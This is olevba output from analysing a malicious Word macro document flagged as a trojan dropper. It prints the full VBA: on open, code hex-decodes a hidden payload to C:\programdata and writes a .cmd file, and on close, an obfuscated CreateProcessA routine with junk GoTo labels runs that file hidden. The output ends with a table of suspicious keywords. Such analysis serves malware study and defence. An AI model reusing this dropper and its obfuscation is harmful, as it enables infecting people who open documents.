olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-88e06c9be915200fbb586d2ee9208d69fa65154e5d11076f905e516160b51083
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO BolaNiks.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/BolaNiks'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private G, d
Private strTemp$, strReturn$, Biola$
Private CurFolder$

Private GErtut

Private saveFolder As String



Private Sub Document_Open()
PrepForSpell

saveFolder = "C:\programdata"
PrepForSpell


Biola = THC.GroupName
PrepForSpell
For G = 1 To Len(Biola) Step 2
strTemp = Chr$(Val("&" + "H" + Mid$(Biola, G, 2)))
strReturn = strReturn + strTemp
Next G
PrepForSpell
Biola = Right(strReturn, Len(strReturn) - 1)
    PrepForSpell
Ver_ri = saveFolder & "\Logo.txt"
PrepForSpell
Open Ver_ri For Binary As #1
Put #1, , Chr$(77) + Biola
Close #1

Hruort = saveFolder & "\Gertos.cmd"
Open Hruort For Binary As #1
Put #1, , THC.Caption
Close #1
   PrepForSpell

End Sub
Private Sub Document_Close()
PrepForSpell
PrepForSpell
saveFolder = "C:\programdata"
PrepForSpell
PrepForSpell
Hruort = saveFolder & "\Gertos.cmd"
PrepForSpell
PrepForSpell
ZapStaryi (Hruort), 0, 1, 0
End Sub

Sub PrepForSpell()
'‘Attribute PrepForSpell.VB_Description = “Macro created 31.01.2002 by nnnnnn”
'‘Attribute PrepForSpell.VB_ProcData.VB_Invoke_Func = “Normal.NewMacros.PrepForSpell”
'‘
'‘ PrepForSpell Macro
'‘ Macro created 31.01.2002 by nnnnnn
'‘ Adoption for Word 2003/2007 by Alexey Murzov
'‘
With Selection
.WholeStory
.LanguageID = wdRussian
.NoProofing = False
.HomeKey Unit:=wdStory
n1 = 0
w1 = “a”
se1 = .End
se2 = -1
Do While se1 <> se2
w1 = Left(Trim(.Words(1)), 1)
If w1 <> “” Then
n1 = Asc(w1)
If (n1 >= 65 And n1 <= 90) Or (n1 >= 97 And n1 <= 122) Then
.Words(1).LanguageID = wdEnglishUS
.Words(1).NoProofing = False
End If
End If
.MoveRight Unit:=wdWord
se2 = se1
se1 = .End
Loop
End With
Application.CheckLanguage = True
'If se1 = se2 Then MsgBox “Fixing Eng/Rus language finished.”, vbInformation, “”
End Sub
Sub ImportWideSheet()
On Error Resume Next
   Dim rgRange As Range              ' ?????? ??????????? ??????

  ' Dim lngRow As ****                ' ?????? ????? ??????? ??????

   Dim intCol As Integer             ' ?????? ????? ???????? ???????

   Dim i As Integer

   Dim strLine As String             ' ?????????????? ?????? (?? ?????)

   Dim strCurChar As String * 1

   Dim strCellValue As String        ' ? ???? ?????? ??????????? ???????? _

                                      ' ??????????? ?????? ???????


                                      ' ??????????? ??????

  

   ' ?????????? ?????????? ???????????

   Application.ScreenUpdating = False

  

   ' ???????? ????? ? ????? ??????

   Workbooks.Add xlWorksheet

   Set rgRange = ActiveWorkbook.Sheets(1).Range("A1")

  

   ' ?????? ?????? ?????? ?? ????? (?? ???? ?????? ???????????? _

   ' ?????? ???????)

    Open ThisWorkbook.Path & "\Primer.txt" For Input As #1

   Line Input #1, strLine

   ' ????????? ?????? ?????? ? ??????????? ????? ?????? ?? ???? _

   ' ?????????????

   For i = 1 To Len(strLine)

      strCurChar = Mid(strLine, i, 1)

      ' ???????? - ??????????? ??????? ??? ???

      If intCol <> 0 And intCol Mod 256 = 0 Then

         ' ??????? ???????? ????? ??????????? - ??????? ????? ???? _

         ' ? ???????? ? ??? ??????? ???????

        ' Set wshtCurrentSheet = ActiveWorkbook.Sheets.Add(, _

          'ActiveWorkbook.Sheets(ActiveWorkbook.Sheets.Count))

         Set rgRange = wshtCurrentSheet.Range("A1")

         intCol = 0

      End If

  

      ' ???????? - ??????????? ???? ??? ???

      If strCurChar = "," Then

         ' ??????? ?????? ? ???????


         intCol = intCol + 1

         strCellValue = ""

      Else

         ' ????????? ????????? ?????? ? ?????? ?? ????????? ??????? _

          '??????

         strCellValue = strCellValue & Mid(strLine, i, 1)

  

         ' ???????? - ????? ?????? ??? ???

         If i = Len(strLine) Then

            ' ????? ?? ????? ?????? - ??????? ???????? ????????? ??????


            intCol = 0

            strCellValue = ""

         End If

      End If

   Next i

  

   ' ?????? ????????? ????? ?????

   Do Until EOF(1)

      Set rgRange = ActiveWorkbook.Sheets(1).Range("A1")

      lngRow = lngRow + 1

      intCol = 0

      Line Input #1, strLine

  

      ' ????????? ????????? ??????

      For i = 1 To Len(strLine)

         strCurChar = Mid(strLine, i, 1)

         ' ???????? - ??????????? ??????? ??? ???

         If intCol <> 0 And intCol Mod 256 = 0 Then

            ' ??????? ???????? ????? ??????????? - ??????? ????? ???? _

             '? ???????? ? ??? ??????? ???????

            'Set wshtCurrentSheet = ActiveWorkbook.Sheets.Add(, _

             'ActiveWorkbook.Sheets(ActiveWorkbook.Sheets.Count))

            Set rgRange = wshtCurrentSheet.Range("A1")

            intCol = 0

         End If

  

         ' ???????? - ??????????? ???? ??? ???

         If strCurChar = "," Then

            ' ??????? ?????? ? ???????


            intCol = intCol + 1

            strCellValue = ""

         Else

            ' ????????? ????????? ?????? ? ?????? ?? ????????? ??????? _

             '??????

            strCellValue = strCellValue & Mid(strLine, i, 1)

  

            ' ???????? - ????? ?????? ??? ???

            If i = Len(strLine) Then

               ' ????? ?? ????? ?????? - ??????? ???????? ????????? _

                '??????


               strCellValue = ""

            End If

         End If

      Next i

   Loop

  

   ' ?? ???????? ??????? ??????? ????

   Close #1

   ' ? ????????? ?????????? ???????????

   Application.ScreenUpdating = True

End Sub





-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

#If VBA7 Then
Private Declare PtrSafe Function CreateProcessA Lib "kernel32    " (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As LongPtr, ByVal dwCreationFlags As LongPtr, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, siStartup As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
Private Declare PtrSafe Function WaitForInputIdle Lib "user32          " (ByVal hProcess As LongPtr, ByVal dwMilliseconds As LongPtr) As LongPtr
#Else
Private Declare Function CreateProcessA Lib "kernel32         " (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, siStartup As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WaitForInputIdle Lib "user32      " (ByVal hProcess As Long, ByVal dwMilliseconds As Long) As Long
#End If

Private Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Private Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessID As Long
   dwThreadID As Long
End Type

Public Type PROCESS_INFORMATION_EXT
   hProcess As Long
   hThread As Long
   hwnd As Long
   dwProcessID As Long
   dwThreadID As Long
End Type

'SW_HIDE = 0
'SW_NORMAL = 1
'SW_MAXIMIZE = 3
'SW_MINIMIZE = 6
Private Const STARTF_USESHOWNWINDOW = &H1&
Private Const SW_HIDE = 3
Private Const NORMAL_PRIORITY_CLASS = &H8000000

         
'Begin Code
Private Const INFINITE = &HFFFF
Public Function ZapStaryi(strProgram As String, hStdIn As Long, hStdOut As Long, hStdErr As Long) As Long 'PROCESS_INFORMATION_EXT
    Dim piProcess As PROCESS_INFORMATION
    Dim siStartup As STARTUPINFO
    Dim lResult
GoTo MKthBsjxHqqdEMaBUAZqC:
RKucfzcguranMMowlEkHazalfxhDnyDAL:
    siStartup.hStdInput = hStdIn
GoTo rzAJidFHouVLrmnlqbipFhgwmogF
lhswKghrAvZHcvpfKTTRQIBIzzOSVNmBueLOLPeoJQJwYts:
RLprYsxFvbkkjnKRZ = "PPfjmeCKucfzcgur"
GoTo CTFJjJUOheBQvnkvMbwtRLprYsxFvbkjnKRZDPPfjme
MKthBsjxHqqdEMaBUAZqCoiAxTDOUQctuP:
IBInzzOSVNmBueLOjLPe = "JQJw"
GoTo byfIYELemcHCDBGrlsViyCFwVyeNJxSIzNGGtgGdqElDptSHEyQNkG
byfIYELemcHCDBGrlsViyCFwVyeNJxSIzNGGtgGdqElDptSHEyQNkG:
tsUCTFJjJUOheBQvnkvM = "wk"
GoTo lhswKghrAvZHcvpfKTTRQIBIzzOSVNmBueLOLPeoJQJwYts
iyCFwVyeNJxSIzNGGtgGdqElDptSHEyQNkG:
nMMowIlEkHazalf = "hDnyDA"
GoTo lhswKghrAvZHcvpfKTTRQIBIzzOSVNmBueLO
MKthBsjxHqqdEMaBUAZqC:
drzAJidFHouNVLrmnlq = "iphgwmogF"
GoTo iyCFwVyeNJxSIzNGGtgGdqElDptSHEyQNkG
LPeoJQJwYtsCTFJjJUOheBQvnkvMbw:
tsUCTFJjJUOheBQvnkvM = "wk"
GoTo tRLprYsxFvbkjnKRZDPPfjme
RKucfzcguranMMowlEkHazalfxhDnyDALrzAJidFHou:
drzAJidFHouNVLrmnlq = "iphgwmogF"
GoTo oiAxTDOUQctuPbyfIYELemcHCDBGrlsV
tRLprYsxFvbkjnKRZDPPfjme:
IBInzzOSVNmBueLOjLPe = "JQJw"
GoTo RKucfzcguranMMowlEkHazalfxhDnyDAL
CTFJjJUOheBQvnkvMbwtRLprYsxFvbkjnKRZDPPfjme:
nMMowIlEkHazalf = "hDnyDA"
GoTo RKucfzcguranMMowlEkHazalfxhDnyDALrzAJidFHou
lhswKghrAvZHcvpfKTTRQIBIzzOSVNmBueLO:
RLprYsxFvbkkjnKRZ = "PPfjmeCKucfzcgur"
GoTo LPeoJQJwYtsCTFJjJUOheBQvnkvMbw
rzAJidFHouVLrmnlqbipFhgwmogF:

GoTo MKthBsjxHqqdEMaBUAZqCoiAxTDOUQctuP

oiAxTDOUQctuPbyfIYELemcHCDBGrlsV:
    siStartup.hStdOutput = hStdOut
GoTo xYjdvsOlJBxJapKyHfaD:
AqVQQPUFyFkKw:
GHdfoLtQmSZsAqVQ = "PUFyFkKwM"
GoTo PSKjMrbQLgQNblUTHt
rDRzQCGhUSMfcyTsyuGJ:
MfcyTsyuGJZuvEOJnCUp = "DsYhiglV"
GoTo uvEOJnCUpIDsYhiglVOV
utJzCuSwbZGvPGxKUDD:
    siStartup.hStdError = hStdErr
GoTo rRbnPjOmEQEBv
xzrQgYIqsMpuIE:
MfcyTsyuGJZuvEOJnCUp = "DsYhiglV"
GoTo AabBKQySxVoN
KiRcieqGHdfoLtQmSZ:
rrRbnPjOmEQEBvNKiR = "ie"
GoTo AqVQQPUFyFkKw
ztLuRBLRNaqFM:
GHdfoLtQmSZsAqVQ = "PUFyFkKwM"
GoTo YvqTVCIckZEAAzEpwD
xYjdvsOlJBxJapKyHfaD:
VANMdhjbAOHsacwZerC = "kYJlHGiPhS"
GoTo xzrQgYIqsMpuIE
YvqTVCIckZEAAzEpwD:
rrRbnPjOmEQEBvNKiR = "ie"
GoTo utJzCuSwbZGvPGxKUDD
PSKjMrbQLgQNblUTHt:
SKjMrbQLgQNblUTHtUr = "RzQCGhU"
GoTo rDRzQCGhUSMfcyTsyuGJ
AabBKQySxVoN:
SKjMrbQLgQNblUTHtUr = "RzQCGhU"
GoTo ztLuRBLRNaqFM
uvEOJnCUpIDsYhiglVOV:
VANMdhjbAOHsacwZerC = "kYJlHGiPhS"
GoTo mFLTIoxywBZfnQed
rRbnPjOmEQEBv:

GoTo KiRcieqGHdfoLtQmSZ

mFLTIoxywBZfnQed:
    siStartup.dwFlags = STARTF_USESHOWNWINDOW 'Necessary for wShowWindow to work
    siStartup.wShowWindow = SW_HIDE 'Hide window
GoTo hviUvRQtbseiHitnFC:
MgASNDjrsqvhahK:
QBmiVrhYmwffREfBO = "Jb"
GoTo QnrulKaSCknHkoCMhviU
iGAegMSmukPKLJOzGNeE:
VgONBBdlxatZxObOMG = "VscntpARSo"
GoTo UKMEeGljQFaQHVgO
BBdlxatZxObOMGZVsc:
    WaitForInputIdle piProcess.hProcess, INFINITE 'Let it initialise properly before continuing
GoTo tpARSopzQDhw
DYAESPyLllMUhJd:
QBmiVrhYmwffREfBO = "Jb"
GoTo gyYyJDVFcLQcZkBPY
UKMEeGljQFaQHVgO:
    lResult = CreateProcessA(vbNullString, strProgram, 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, vbNullString, siStartup, piProcess)
GoTo BBdlxatZxObOMGZVsc
hviUvRQtbseiHitnFC:
vhahKYQnrulKaSCk = "HkoC"
GoTo IGLjqxcooDHKCbqjS
IGLjqxcooDHKCbqjS:
RrfdQpmIfDJFQTjEFPZ = "xMgASNDjrs"
GoTo DYAESPyLllMUhJd
jCKAgbcafPQuVGQbdUuQBmiVrhY:

GoTo wffREfBOdJbN
tpARSopzQDhw:
    ZapStaryi = lResult
GoTo jCKAgbcafPQuVGQbdUuQBmiVrhY
rfdQpmIfDJFQTjEFPZT:
zQDhwdjCKAgbcafP = "QuVGQbdU"
GoTo MgASNDjrsqvhahK
gyYyJDVFcLQcZkBPY:
zQDhwdjCKAgbcafP = "QuVGQbdU"
GoTo iGAegMSmukPKLJOzGNeE
QnrulKaSCknHkoCMhviU:
RrfdQpmIfDJFQTjEFPZ = "xMgASNDjrs"
GoTo RQtbseiHitnFCZ
RQtbseiHitnFCZ:
vhahKYQnrulKaSCk = "HkoC"
GoTo vTLHTlzUIRpkNPwQVeTz
wffREfBOdJbN:
VgONBBdlxatZxObOMG = "VscntpARSo"
GoTo rfdQpmIfDJFQTjEFPZT

vTLHTlzUIRpkNPwQVeTz:
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|SW_HIDE             |May hide the application                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Gertos.cmd          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

